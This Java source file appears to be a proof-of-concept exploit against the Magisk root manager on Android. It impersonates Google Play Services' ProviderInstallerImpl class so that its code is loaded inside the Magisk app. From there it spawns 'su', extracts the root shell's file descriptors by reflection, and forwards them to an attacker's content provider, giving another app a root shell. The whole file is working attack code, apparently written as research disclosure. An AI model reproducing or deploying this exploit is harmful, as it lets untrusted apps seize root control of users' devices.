package com.google.android.gms.common.security;

import android.content.Context;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.os.Process;
import android.util.Log;

import org.lsposed.hiddenapibypass.HiddenApiBypass;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FilterInputStream;
import java.io.FilterOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;

import top.canyie.magiskeop.MyProvider;

/**
 * @author canyie
 */
public class ProviderInstallerImpl {
    public static void insertProvider(Context context) {
        Log.e("PoC", "Injected magisk app!!! context = " + context);
        Log.e("PoC", "pid = " + Process.myPid() + " uid = " + Process.myUid());
        try {
            HiddenApiBypass.addHiddenApiExemptions("");
            java.lang.Process su = Runtime.getRuntime().exec("su");
            Bundle args = new Bundle();
            try (InputStream in = su.getInputStream()) {
                args.putParcelable(MyProvider.IN, convertInputStream(in));
            }
            try (OutputStream out = su.getOutputStream()) {
                args.putParcelable(MyProvider.OUT, convertOutputStream(out));
            }
            context.getContentResolver().call("top.canyie.magiskeop", MyProvider.METHOD, null, args);
        } catch (Exception e) {
            Log.e("PoC", "Failed to forward root shell", e);
        }
        Log.e("PoC", "forward done");
    }

    private static ParcelFileDescriptor convertInputStream(InputStream in) throws Exception {
        Field base = FilterInputStream.class.getDeclaredField("in");
        base.setAccessible(true);
        FileInputStream fis = (FileInputStream) base.get(in);
        return ParcelFileDescriptor.dup(fis.getFD());
    }

    private static ParcelFileDescriptor convertOutputStream(OutputStream in) throws Exception {
        Field base = FilterOutputStream.class.getDeclaredField("out");
        base.setAccessible(true);
        FileOutputStream fos = (FileOutputStream) base.get(in);
        return ParcelFileDescriptor.dup(fos.getFD());
    }
}
